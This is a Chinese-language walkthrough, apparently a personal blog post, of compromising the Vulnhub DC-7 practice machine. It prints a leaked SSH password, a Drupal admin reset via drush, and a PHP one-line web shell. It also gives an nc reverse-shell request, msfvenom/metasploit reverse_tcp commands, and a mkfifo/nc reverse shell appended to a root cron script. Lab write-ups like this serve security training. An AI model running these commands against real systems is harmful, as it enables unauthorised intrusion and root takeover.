---
layout: mypost
title: Vulnhub靶机DC7渗透
categories: [靶机]
---

靶机下载地址：[DC7](https://www.vulnhub.com/entry/dc-7,356/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/27/gC89aV.png)

DC7 地址：192.168.43.75

访问 web 页面

![](https://z3.ax1x.com/2021/04/27/gC8ZrR.png)

好嘛，还是 drupal

![](https://z3.ax1x.com/2021/04/27/gC8KIK.png)

这次多了一处个人信息

![](https://z3.ax1x.com/2021/04/27/gCGnyj.png)

简单社工一下

![](https://z3.ax1x.com/2021/04/27/gCG9OA.png)

![](https://z3.ax1x.com/2021/04/27/gCGItf.png)

![](https://z3.ax1x.com/2021/04/27/gCGOns.png)

![](https://z3.ax1x.com/2021/04/27/gCJShT.png)

config.php 很可疑

![](https://z3.ax1x.com/2021/04/27/gCJku9.png)

得到 dc7user 的密码 MdR3xOgB7#dW

只能登录 ssh

![](https://z3.ax1x.com/2021/04/27/gCJEH1.png)

![](https://z3.ax1x.com/2021/04/27/gCJUC8.png)

提示邮箱

![](https://z3.ax1x.com/2021/04/27/gCJyEq.png)

提示 /opt/scripts/backups.sh 

![](https://z3.ax1x.com/2021/04/27/gCJW2F.png)

在 /var/www/html 下，drush 可以用来修改 drupal 站点用户密码

![](https://z3.ax1x.com/2021/04/27/gCJO2D.png)

根据简单扫目录结果和之前经验，admin 是 drupal 站点默认最高权限用户

```bash
drush user-password admin --password="Stan"
```

![](https://z3.ax1x.com/2021/04/27/gCYZrj.png)

成功修改密码

![](https://z3.ax1x.com/2021/04/27/gCYKI0.png)

这里借鉴 [Drupal to Reverse Shell](https://www.sevenlayers.com/index.php/164-drupal-to-reverse-shell) 的思路，下载 [插件](https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz)

![](https://z3.ax1x.com/2021/04/27/gCYysH.png)

安装

![](https://z3.ax1x.com/2021/04/27/gCY2dI.png)

选用

![](https://z3.ax1x.com/2021/04/27/gCYRot.png)

测试

![](https://z3.ax1x.com/2021/04/27/gCYbes.png)

![](https://z3.ax1x.com/2021/04/27/gCYvWT.png)

可行，准备反弹 shell

可以传个一句话🐎

```shell
<?php system($_GET['a'])?>
```

本地监听访问 

```url
http://192.168.43.75/node/4?a=nc -e /bin/bash 127.0.0.1 2333
```

![](https://z3.ax1x.com/2021/04/27/gCtmlD.png)

或者用 msfvenom 生成 payload

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.110 LPORT=1100 -f raw
```

![](https://z3.ax1x.com/2021/04/27/gCt8tP.png)

配合 metasploit

```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.43.110
set lport 1100
```

![](https://z3.ax1x.com/2021/04/27/gCtYp8.png)

成功上线，用 python 获取标准交互 shell

![](https://z3.ax1x.com/2021/04/27/gCNxr4.png)

![](https://z3.ax1x.com/2021/04/27/gCUUds.png)

结合之前信息知道有一个 root 权限执行的计划任务，调用了 backups.sh 脚本，而这个脚本只有 root 和 www-data 用户可以修改

使用 drupal 反弹回来的 shell 用户是 www-data，所以接下来是将反弹 shell 的代码附加到backups.sh 脚本里

> 计划任务是 root 权限执行的，所以反弹回来的 shell 也会是 root 用户

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.110 4311 >/tmp/f" >> backups.sh
```

![](https://z3.ax1x.com/2021/04/27/gCUDzT.png)

监听等待计划任务执行，大概十几分钟

![](https://z3.ax1x.com/2021/04/27/gCU2w9.png)

Pwned！